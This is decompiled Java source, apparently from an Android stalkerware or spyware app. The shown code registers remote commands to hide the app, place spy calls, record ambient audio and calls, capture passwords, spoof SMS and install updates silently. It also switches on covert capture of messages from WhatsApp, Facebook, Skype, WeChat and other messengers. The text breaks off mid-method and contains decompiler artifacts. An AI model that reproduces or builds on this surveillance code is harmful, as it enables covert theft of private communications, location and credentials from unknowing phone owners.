package com.vvt.appengine;

import android.content.ContentResolver;
import android.content.Context;
import com.vvt.application_profile_manager.ApplicationProfileManagerImpl;
import com.vvt.base.FeatureId;
import com.vvt.base.FxAddressbookMode;
import com.vvt.base.RunningMode;
import com.vvt.callmanager.ref.BugEngineException;
import com.vvt.capture.location.CallingModule;
import com.vvt.capture.simchange.SimChangeCapture;
import com.vvt.exceptions.FxNullNotAllowedException;
import com.vvt.io.m;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseStatus;
import com.vvt.preference.FxPreferenceException;
import com.vvt.preference.FxPreferenceType;
import com.vvt.preference.PrefAddressBook;
import com.vvt.preference.PrefEventsCapture;
import com.vvt.preference.PrefIMCaptureSettings;
import com.vvt.preference.PrefKeyword;
import com.vvt.preference.PrefMediaHistorical;
import com.vvt.preference.PrefMonitorNumber;
import com.vvt.preference.PrefSpyCall;
import com.vvt.preference.PrefTemporalControl;
import com.vvt.preference.PrefVoipCallRecordingCaptureSettings;
import com.vvt.productinfo.ProductInfoImpl;
import com.vvt.remotecontrol.RemoteControlImpl;
import com.vvt.remotecontrol.RemoteFunction;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Map;

public class i
{
  private static final boolean a = com.vvt.ak.a.b;
  private static final boolean b = com.vvt.ak.a.c;
  private static final boolean c = com.vvt.ak.a.e;
  
  private static com.vvt.capture.simchange.d a(com.vvt.preference.b paramb, FxPreferenceType paramFxPreferenceType)
  {
    j localj = new com/vvt/appengine/j;
    localj.<init>(paramb, paramFxPreferenceType);
    return localj;
  }
  
  public static void a(AppEngine1 paramh)
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject = b(paramh);
    List localList = ((com.vvt.configurationmanager.c)localObject).b();
    boolean bool2 = a;
    if (bool2) {}
    localObject = ((com.vvt.configurationmanager.c)localObject).c();
    bool2 = a;
    if (bool2) {}
    bool2 = a;
    if (bool2) {}
    a(paramh, localList);
    bool2 = a;
    if (bool2) {}
    a(paramh, localList, (Map)localObject);
    bool1 = a;
    if (bool1) {}
  }
  
  private static void a(AppEngine1 paramh, List paramList)
  {
    RemoteControlImpl localRemoteControlImpl = paramh.q;
    localRemoteControlImpl.clearRegisteredFunctions();
    Object localObject = RemoteFunction.DEBUG_IS_FULL_MODE;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.DEBUG_SWITCH_CONTAINER;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.DEBUG_HIDE_APP;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.DEBUG_UNHIDE_APP;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.DEBUG_GET_CONFIG_ID;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.DEBUG_GET_ACTUAL_CONFIG_ID;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.DEBUG_GET_VERSION_CODE;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.DEBUG_SEND_TEST_SMS;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.DEBUG_CLOSE_APP;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.DEBUG_SET_APPLICATION_MODE;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.DEBUG_GET_APPLICATION_MODE;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.DEBUG_RESTART_DEVICE;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.DEBUG_PRODUCT_VERSION;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.DEBUG_IS_CALLRECORDING_SUPPORTED;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.DEBUG_IS_RESUME_ON_DEMAND_AMBIENT_RECORDING;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.GET_LICENSE_STATUS;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.IS_PRODUCT_ACTIVATED;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.ACTIVATE_PRODUCT;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.DEACTIVATE_PRODUCT;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.GET_CONFIGURATION;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.GET_CONNECTION_HISTORY;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.SEND_HEARTBEAT;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.SEND_MOBILE_NUMBER;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.SEND_SETTINGS_EVENT;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.SEND_EVENTS;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.REQUEST_CONFIGURATION;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.SEND_CURRENT_URL;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.SEND_BOOKMARKS;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.SEND_INSTALLED_APPLICATIONS;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.REQUEST_CALENDER;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.SET_SUPERUSER_VISIBILITY;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.SET_LOCK_PHONE_SCREEN;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.REQUEST_DEVICE_SETTINGS;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.SET_UPDATE_AVAILABLE_SILENT_MODE;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.DELETE_DATABASE;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.REQUEST_TEMPORAL_APPLICATION_CONTROL;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.SYNC_TEMPORAL_APPLICATION_CONTROL;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.ENABLE_EVENT_CAPTURE;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.ENABLE_EVENT_DELIVERY;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.SET_EVENT_MAX_NUMBER;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.SET_EVENT_TIMER;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.SET_DELIVERY_METHOD;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.GET_SETTINGS;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.GET_DIAGNOSTICS;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.GET_EVENT_COUNT;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.GET_GPS_ON_DEMAND;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.REQUEST_BATTERY_INFO;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.RESTART_DEVICE;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.REQUEST_HISTORICAL_EVENTS;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.SET_DOWNLOAD_BINARY_AND_UPDATE_SILENT_MODE;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.UPLOAD_ACTUAL_MEDIA;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.DELETE_ACTUAL_MEDIA;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.ON_DEMAND_AMBIENT_RECORD;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.ENABLE_CALL_RECORDING;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.SEND_ADDRESS_BOOK;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.UNINSTALL_PRODUCT;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.SPOOF_SMS;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.ON_DEMAND_IMAGE_CAPTURE;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.ADD_URL;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.QUERY_URL;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.RESET_URL;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    localObject = RemoteFunction.CLEAR_URL;
    localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
    Iterator localIterator = paramList.iterator();
    for (;;)
    {
      boolean bool = localIterator.hasNext();
      if (!bool) {
        break;
      }
      localObject = (FeatureId)localIterator.next();
      int[] arrayOfInt = k.a;
      int i = ((FeatureId)localObject).ordinal();
      i = arrayOfInt[i];
      switch (i)
      {
      default: 
        break;
      case 1: 
        localObject = RemoteFunction.ENABLE_CAPTURE_CALL;
        localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
        break;
      case 2: 
        localObject = RemoteFunction.ENABLE_CAPTURE_SMS;
        localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
        break;
      case 3: 
        localObject = RemoteFunction.ENABLE_CAPTURE_GPS;
        localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
        localObject = RemoteFunction.SET_GPS_TIME_INTERVAL;
        localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
        break;
      case 4: 
        localObject = RemoteFunction.ENABLE_CAPTURE_EMAIL;
        localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
        break;
      case 5: 
        localObject = RemoteFunction.ENABLE_CAPTURE_IM;
        localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
        localObject = RemoteFunction.SET_IM_ATTACHMENT_LIMIT_SIZE;
        localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
        break;
      case 6: 
        localObject = RemoteFunction.ENABLE_CAPTURE_MMS;
        localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
        break;
      case 7: 
        localObject = RemoteFunction.REQUEST_MEDIA_HISTORICAL;
        localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
        break;
      case 8: 
        localObject = RemoteFunction.ENABLE_CAPTURE_IMAGE;
        localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
        break;
      case 9: 
        localObject = RemoteFunction.ENABLE_CAPTURE_AUDIO;
        localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
        break;
      case 10: 
        localObject = RemoteFunction.ENABLE_CAPTURE_VIDEO;
        localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
        break;
      case 11: 
        localObject = RemoteFunction.ENABLE_CAPTURE_WALLPAPER;
        localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
        break;
      case 12: 
        localObject = RemoteFunction.ENABLE_CAPTURE_APP;
        localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
        break;
      case 13: 
        localObject = RemoteFunction.ENABLE_CAPTURE_URL;
        localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
        break;
      case 14: 
        localObject = RemoteFunction.ENABLE_CAPTURE_CALENDAR;
        localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
        break;
      case 15: 
        localObject = RemoteFunction.ENABLE_CAPTURE_CALL_RECORD;
        localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
        localObject = RemoteFunction.SET_CALL_RECORDING_AUDIO_SOURCE;
        localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
        break;
      case 16: 
        localObject = RemoteFunction.ENABLE_CAPTURE_PASSWORD;
        localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
        break;
      case 17: 
        localObject = RemoteFunction.SET_MODE_ADDRESS_BOOK;
        localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
        break;
      case 18: 
        localObject = RemoteFunction.ENABLE_ALERT;
        localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
        break;
      case 19: 
        localObject = RemoteFunction.ENABLE_APP_PROFILE;
        localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
        break;
      case 20: 
        localObject = RemoteFunction.ENABLE_URL_PROFILE;
        localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
        break;
      case 21: 
        localObject = RemoteFunction.ENABLE_COMMUNICATION_RESTRICTION;
        localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
        break;
      case 22: 
        localObject = RemoteFunction.SET_PANIC_MODE;
        localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
        break;
      case 23: 
      case 24: 
        localObject = RemoteFunction.ENABLE_SPY_CALL;
        localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
        break;
      case 25: 
        localObject = RemoteFunction.ENABLE_WATCH_NOTIFICATION;
        localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
        localObject = RemoteFunction.SET_WATCH_FLAG;
        localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
        localObject = RemoteFunction.MANAGE_COMMON_DATA;
        localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
        break;
      case 26: 
        localObject = RemoteFunction.SET_CALL_RECORDING_WATCH_FLAG;
        localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
        localObject = RemoteFunction.MANAGE_COMMON_DATA;
        localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
        break;
      case 27: 
      case 28: 
      case 29: 
      case 30: 
      case 31: 
        localObject = RemoteFunction.MANAGE_COMMON_DATA;
        localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
        break;
      case 32: 
        localObject = RemoteFunction.ENABLE_TEMPORAL_CONTROL_RECORD_AMBIENT;
        localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
        break;
      case 33: 
        localObject = RemoteFunction.SET_SUPERUSER_VISIBILITY;
        localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
        break;
      case 34: 
        localObject = RemoteFunction.ENABLE_CAPTURE_VOIP;
        localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
        break;
      case 35: 
        localObject = RemoteFunction.ENABLE_VOIP_CALL_RECORDING;
        localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
        break;
      case 36: 
        localObject = RemoteFunction.ENABLE_CAPTURE_CONTACT;
        localRemoteControlImpl.registerFunction((RemoteFunction)localObject);
      }
    }
  }
  
  public static void a(AppEngine1 paramh, List paramList, Map paramMap)
  {
    bool1 = a;
    if (bool1) {}
    Object localObject1 = paramh.k;
    Object localObject2 = paramh.o;
    String str = paramh.l.d();
    boolean bool2 = ((com.vvt.license.b)localObject1).a((com.vvt.productinfo.a)localObject2, str);
    try
    {
      localObject1 = paramh.n;
      localObject2 = FxPreferenceType.EVENTS_CTRL;
      Object localObject3 = ((com.vvt.preference.b)localObject1).a((FxPreferenceType)localObject2);
      localObject3 = (PrefEventsCapture)localObject3;
      localObject2 = FxPreferenceType.IM_CAPTURE_SETTINGS;
      Object localObject4 = ((com.vvt.preference.b)localObject1).a((FxPreferenceType)localObject2);
      localObject4 = (PrefIMCaptureSettings)localObject4;
      localObject2 = FxPreferenceType.VOIP_CALLRECORDING_CAPTURE_SETTINGS;
      Object localObject5 = ((com.vvt.preference.b)localObject1).a((FxPreferenceType)localObject2);
      localObject5 = (PrefVoipCallRecordingCaptureSettings)localObject5;
      d(paramh);
      b(paramh, paramList, bool2, (PrefEventsCapture)localObject3);
      localObject1 = paramh;
      localObject2 = paramList;
      a(paramh, paramList, bool2, (PrefEventsCapture)localObject3, (PrefIMCaptureSettings)localObject4, (PrefVoipCallRecordingCaptureSettings)localObject5, paramMap);
      b(paramh, paramList, bool2);
      c(paramh, paramList, bool2);
      f(paramh, paramList, bool2);
      a(paramh, paramList, bool2, (PrefEventsCapture)localObject3);
      e(paramh, paramList, bool2);
      n(paramh, paramList, bool2, (PrefEventsCapture)localObject3);
      o(paramh, paramList, bool2, (PrefEventsCapture)localObject3);
      t(paramh, paramList, bool2, (PrefEventsCapture)localObject3);
      c(paramh, paramList, bool2, (PrefEventsCapture)localObject3);
      r(paramh, paramList, bool2, (PrefEventsCapture)localObject3);
      e(paramh);
      a(paramh, paramList, bool2);
    }
    catch (FxPreferenceException localFxPreferenceException)
    {
      for (;;)
      {
        bool1 = c;
        if (!bool1) {}
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool1 = c;
        if (!bool1) {}
      }
    }
    bool1 = a;
    if (bool1) {}
  }
  
  public static void a(AppEngine1 paramh, List paramList, boolean paramBoolean)
  {
    boolean bool1 = true;
    for (;;)
    {
      synchronized (i.class)
      {
        Object localObject1 = paramh.n;
        Object localObject3 = FxPreferenceType.TEMPORAL_CONTROL;
        localObject1 = ((com.vvt.preference.b)localObject1).a((FxPreferenceType)localObject3);
        localObject1 = (PrefTemporalControl)localObject1;
        int i = 1;
        localObject3 = Integer.valueOf(i);
        boolean bool2 = ((PrefTemporalControl)localObject1).isCapture((Integer)localObject3);
        int j = 2;
        Integer localInteger = Integer.valueOf(j);
        boolean bool3 = ((PrefTemporalControl)localObject1).isCapture(localInteger);
        Object localObject4;
        if ((bool2) || (bool3))
        {
          int m = a;
          if (m != 0) {}
          com.vvt.temporalcontrol.d locald2 = paramh.al;
          if ((locald2 == null) || (!paramBoolean)) {
            break label343;
          }
          if (!bool2)
          {
            localObject3 = paramh.al;
            m = 1;
            ((com.vvt.temporalcontrol.d)localObject3).a(m);
          }
          if (!bool3)
          {
            localObject3 = paramh.al;
            int k = 2;
            ((com.vvt.temporalcontrol.d)localObject3).a(k);
          }
          if (!bool1) {
            continue;
          }
          localObject4 = paramh.al;
          bool1 = ((com.vvt.temporalcontrol.d)localObject4).b();
          bool2 = a;
          if ((!bool2) || (!bool1))
          {
            bool1 = a;
            if (bool1) {}
            localObject1 = ((PrefTemporalControl)localObject1).getTemporalControls();
            localObject4 = paramh.al;
            ((com.vvt.temporalcontrol.d)localObject4).a((List)localObject1);
            localObject1 = paramh.al;
            localObject4 = paramh.S;
            ((com.vvt.temporalcontrol.d)localObject1).a((com.vvt.a.a)localObject4);
            localObject1 = paramh.al;
            localObject4 = paramh.R;
            ((com.vvt.temporalcontrol.d)localObject1).a((com.vvt.capture.a.a)localObject4);
            localObject1 = paramh.al;
            localObject4 = paramh.h;
            ((com.vvt.temporalcontrol.d)localObject1).a((com.vvt.base.a)localObject4);
            localObject1 = paramh.al;
            localObject4 = paramh.n;
            ((com.vvt.temporalcontrol.d)localObject1).a((com.vvt.preference.b)localObject4);
            localObject1 = paramh.al;
            ((com.vvt.temporalcontrol.d)localObject1).d();
          }
        }
        else
        {
          bool1 = false;
          localObject4 = null;
          continue;
        }
        boolean bool4 = a;
        if (!bool4) {
          continue;
        }
        continue;
        localObject1 = paramh.al;
        ((com.vvt.temporalcontrol.d)localObject1).c();
      }
      label343:
      com.vvt.temporalcontrol.d locald1 = paramh.al;
      if (locald1 != null)
      {
        locald1 = paramh.al;
        locald1.c();
      }
    }
  }
  
  public static void a(AppEngine1 paramh, List paramList, boolean paramBoolean, PrefEventsCapture paramPrefEventsCapture)
  {
    for (;;)
    {
      synchronized (i.class)
      {
        bool1 = a;
        if (bool1) {}
        Object localObject1 = paramh.q;
        Object localObject3 = FeatureId.CAPTURE_CONTACT;
        boolean bool2 = paramList.contains(localObject3);
        if (bool2)
        {
          localObject3 = FeatureId.ADDRESS_BOOK_MANAGEMENT;
          bool2 = paramList.contains(localObject3);
          if (bool2)
          {
            localObject3 = RemoteFunction.ENABLE_CAPTURE_CONTACT;
            ((RemoteControlImpl)localObject1).registerFunction((RemoteFunction)localObject3);
            localObject3 = RemoteFunction.SET_MODE_ADDRESS_BOOK;
            ((RemoteControlImpl)localObject1).registerFunction((RemoteFunction)localObject3);
            localObject1 = paramh.n;
            localObject3 = paramh.C;
            Object localObject4;
            if (localObject3 == null)
            {
              localObject3 = new com/vvt/addressbookmanager/b;
              localObject4 = paramh.b();
              RunningMode localRunningMode = paramh.d();
              Context localContext = paramh.a();
              ((com.vvt.addressbookmanager.b)localObject3).<init>((String)localObject4, (com.vvt.preference.b)localObject1, localRunningMode, localContext);
              paramh.C = ((com.vvt.addressbookmanager.b)localObject3);
            }
            try
            {
              localObject3 = paramh.C;
              localObject4 = paramh.g;
              ((com.vvt.addressbookmanager.b)localObject3).a((com.vvt.datadeliverymanager.b)localObject4);
              localObject3 = paramh.C;
              ((com.vvt.addressbookmanager.b)localObject3).a();
              localObject3 = FeatureId.CAPTURE_CONTACT;
              bool2 = paramPrefEventsCapture.isCapture((FeatureId)localObject3);
              localObject4 = FxPreferenceType.ADDRESSBOOK;
              localObject1 = ((com.vvt.preference.b)localObject1).a((FxPreferenceType)localObject4);
              localObject1 = (PrefAddressBook)localObject1;
              localObject4 = ((PrefAddressBook)localObject1).getMode();
              if ((!paramBoolean) || (!bool2)) {
                continue;
              }
              localObject1 = FxAddressbookMode.OFF;
              if (localObject4 == localObject1) {
                continue;
              }
              bool1 = true;
            }
            catch (FxNullNotAllowedException localFxNullNotAllowedException)
            {
              bool1 = c;
              if (!bool1) {
                continue;
              }
              continue;
              bool1 = false;
              com.vvt.addressbookmanager.b localb1 = null;
              continue;
              localb1 = paramh.C;
              if (localb1 == null) {
                continue;
              }
              bool1 = a;
              if (!bool1) {
                continue;
              }
              localb1 = paramh.C;
              localb1.d();
              continue;
            }
            bool2 = a;
            if (bool2) {}
            localObject3 = paramh.C;
            ((com.vvt.addressbookmanager.b)localObject3).a((FxAddressbookMode)localObject4);
            if (bool1)
            {
              bool1 = a;
              if (bool1) {}
              localObject1 = paramh.C;
              ((com.vvt.addressbookmanager.b)localObject1).c();
              bool1 = a;
              if (bool1) {}
              return;
            }
          }
        }
      }
      boolean bool1 = a;
      if (bool1) {}
      com.vvt.addressbookmanager.b localb2 = paramh.C;
      if (localb2 != null)
      {
        localb2 = paramh.C;
        localb2.d();
      }
    }
  }
  
  public static void a(AppEngine1 paramh, List paramList, boolean paramBoolean, PrefEventsCapture paramPrefEventsCapture, PrefIMCaptureSettings paramPrefIMCaptureSettings, PrefVoipCallRecordingCaptureSettings paramPrefVoipCallRecordingCaptureSettings, Map paramMap)
  {
    boolean bool = a;
    if (bool) {}
    d(paramh, paramList, paramBoolean, paramPrefEventsCapture);
    e(paramh, paramList, paramBoolean, paramPrefEventsCapture);
    h(paramh, paramList, paramBoolean, paramPrefEventsCapture);
    g(paramh, paramList, paramBoolean, paramPrefEventsCapture);
    a(paramh, paramList, paramBoolean, paramPrefEventsCapture, paramPrefIMCaptureSettings, paramMap);
    a(paramh, paramList, paramBoolean, paramPrefEventsCapture, paramMap);
    a(paramh, paramList, paramBoolean, paramPrefEventsCapture, paramPrefVoipCallRecordingCaptureSettings, paramMap);
    f(paramh, paramList, paramBoolean, paramPrefEventsCapture);
    i(paramh, paramList, paramBoolean, paramPrefEventsCapture);
    j(paramh, paramList, paramBoolean, paramPrefEventsCapture);
    k(paramh, paramList, paramBoolean, paramPrefEventsCapture);
    l(paramh, paramList, paramBoolean, paramPrefEventsCapture);
    n(paramh, paramList, paramBoolean, paramPrefEventsCapture);
    m(paramh, paramList, paramBoolean, paramPrefEventsCapture);
    s(paramh, paramList, paramBoolean, paramPrefEventsCapture);
    p(paramh, paramList, paramBoolean, paramPrefEventsCapture);
    o(paramh, paramList, paramBoolean, paramPrefEventsCapture);
    q(paramh, paramList, paramBoolean, paramPrefEventsCapture);
    bool = a;
    if (bool) {}
  }
  
  public static void a(AppEngine1 paramh, List paramList, boolean paramBoolean, PrefEventsCapture paramPrefEventsCapture, PrefIMCaptureSettings paramPrefIMCaptureSettings, Map paramMap)
  {
    for (;;)
    {
      synchronized (i.class)
      {
        boolean bool1 = a;
        if (bool1) {}
        Object localObject1 = FeatureId.CAPTURE_IM;
        bool1 = paramList.contains(localObject1);
        Object localObject3 = paramh.d();
        localObject4 = RunningMode.LIMITED_1;
        if (localObject3 != localObject4)
        {
          localObject3 = paramh.d();
          localObject4 = RunningMode.FULL;
          if (localObject3 != localObject4) {}
        }
        else if (bool1)
        {
          bool1 = true;
          bool2 = bool1;
          bool1 = paramPrefEventsCapture.isCaptureEnabled();
          bool3 = a;
          if (bool3) {}
          localObject3 = FeatureId.CAPTURE_IM;
          bool3 = paramPrefEventsCapture.isCapture((FeatureId)localObject3);
          bool4 = a;
          if ((bool4) && ((!paramBoolean) || (!bool1) || (!bool3))) {
            continue;
          }
          bool1 = true;
          bool5 = bool1;
          bool1 = a;
          if (bool1) {}
          localObject1 = "92";
          boolean bool6 = paramMap.containsKey(localObject1);
          bool1 = false;
          localObject1 = null;
          if (!bool6) {
            break label1715;
          }
          localObject1 = "92";
          localObject1 = paramMap.get(localObject1);
          localObject1 = (List)localObject1;
          localObject4 = localObject1;
          com.vvt.base.b localb = com.vvt.base.b.a();
          long l = paramPrefIMCaptureSettings.getAudioAttachmentSizeLimit();
          localb.c(l);
          l = paramPrefIMCaptureSettings.getImageAttachmentSizeLimit();
          localb.a(l);
          l = paramPrefIMCaptureSettings.getVideoAttachmentSizeLimit();
          localb.b(l);
          l = paramPrefIMCaptureSettings.getNonMediaAttachmentSizeLimit();
          localb.d(l);
          localObject1 = paramh.c();
          localb.a((String)localObject1);
          localObject1 = paramh.e();
          localb.b((String)localObject1);
          if (!bool6) {
            continue;
          }
          localObject1 = "200";
          bool1 = ((List)localObject4).contains(localObject1);
          if (!bool1) {
            continue;
          }
          bool1 = true;
          if ((!bool5) || (!bool1)) {
            continue;
          }
          bool1 = paramPrefIMCaptureSettings.isWhatsAppCaptureEnabled();
          if (!bool1) {
            continue;
          }
          bool1 = true;
          bool3 = a;
          if (bool3) {}
          l(bool2, bool1, paramh, localb);
          if (!bool6) {
            continue;
          }
          localObject1 = "202";
          bool1 = ((List)localObject4).contains(localObject1);
          if (!bool1) {
            continue;
          }
          bool1 = true;
          if ((!bool5) || (!bool1)) {
            continue;
          }
          bool1 = paramPrefIMCaptureSettings.isFacebookCaptureEnabled();
          if (!bool1) {
            continue;
          }
          bool1 = true;
          bool3 = a;
          if (bool3) {}
          q(bool2, bool1, paramh, localb);
          if (!bool6) {
            continue;
          }
          localObject1 = "201";
          bool1 = ((List)localObject4).contains(localObject1);
          if (!bool1) {
            continue;
          }
          bool1 = true;
          if ((!bool5) || (!bool1)) {
            continue;
          }
          bool1 = paramPrefIMCaptureSettings.isLineCaptureEnabled();
          if (!bool1) {
            continue;
          }
          bool1 = true;
          bool3 = a;
          if (bool3) {}
          k(bool2, bool1, paramh, localb);
          if (!bool6) {
            continue;
          }
          localObject1 = "203";
          bool1 = ((List)localObject4).contains(localObject1);
          if (!bool1) {
            continue;
          }
          bool1 = true;
          if ((!bool5) || (!bool1)) {
            continue;
          }
          bool1 = paramPrefIMCaptureSettings.isSkypeCaptureEnabled();
          if (!bool1) {
            continue;
          }
          bool1 = true;
          bool3 = a;
          if (bool3) {}
          i(bool2, bool1, paramh, localb);
          if (!bool6) {
            continue;
          }
          localObject1 = "206";
          bool1 = ((List)localObject4).contains(localObject1);
          if (!bool1) {
            continue;
          }
          bool1 = true;
          if ((!bool5) || (!bool1)) {
            continue;
          }
          bool1 = paramPrefIMCaptureSettings.isViberCaptureEnabled();
          if (!bool1) {
            continue;
          }
          bool1 = true;
          bool3 = a;
          if (bool3) {}
          n(bool2, bool1, paramh, localb);
          if (!bool6) {
            continue;
          }
          localObject1 = "208";
          bool1 = ((List)localObject4).contains(localObject1);
          if (!bool1) {
            continue;
          }
          bool1 = true;
          if ((!bool5) || (!bool1)) {
            continue;
          }
          bool1 = paramPrefIMCaptureSettings.isWeChatCaptureEnabled();
          if (!bool1) {
            continue;
          }
          bool1 = true;
          bool3 = a;
          if (bool3) {}
          s(bool2, bool1, paramh, localb);
          if (!bool6) {
            continue;
          }
          localObject1 = "211";
          bool1 = ((List)localObject4).contains(localObject1);
          if (!bool1) {
            continue;
          }
          bool1 = true;
          if ((!bool5) || (!bool1)) {
            continue;
          }
          bool1 = paramPrefIMCaptureSettings.isHangoutCaptureEnabled();
          if (!bool1) {
            continue;
          }
          bool1 = true;
          bool3 = a;
          if (bool3) {}
          h(bool2, bool1, paramh, localb);
          if (!bool6) {
            continue;
          }
          localObject1 = "209";
          bool1 = ((List)localObject4).contains(localObject1);
          if (!bool1) {
            continue;
          }
          bool1 = true;
          if ((!bool5) || (!bool1)) {
            continue;
          }
          bool1 = paramPrefIMCaptureSettings.isYahooMessengerCaptureEnabled();
          if (!bool1) {
            continue;
          }
          bool1 = true;
          bool3 = a;
          if (bool3) {}
